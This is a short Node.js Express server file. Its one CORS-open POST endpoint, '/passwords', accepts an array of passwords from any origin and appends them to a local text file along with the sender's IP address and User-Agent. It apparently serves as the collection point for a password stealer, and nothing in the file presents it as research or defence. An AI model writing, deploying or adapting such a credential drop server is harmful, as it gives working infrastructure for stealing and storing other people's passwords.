const express = require("express");
const app = express();
const cors = require("cors");
app.use(cors());
const fs = require("fs");
const bodyParser = require("body-parser");

const PORT = 3000;

app.use(bodyParser.json());

app.post("/passwords", (req, res) => {
  const ip = req.ip;
  const userAgent = req.get("User-Agent");
  const passwords = req.body.passwords;
  const path = "passwords.txt";

  fs.appendFileSync(
    path,
    `UserAgent: ${userAgent}\nIp: ${ip}\nPasswords: \n${passwords.join(
      "\n"
    )}\n\n\n\n`
  );

  res.json("Success");
});

app.listen(PORT, (error) => {
  error ? console.log(error) : console.log(`listening to port ${PORT}`);
});
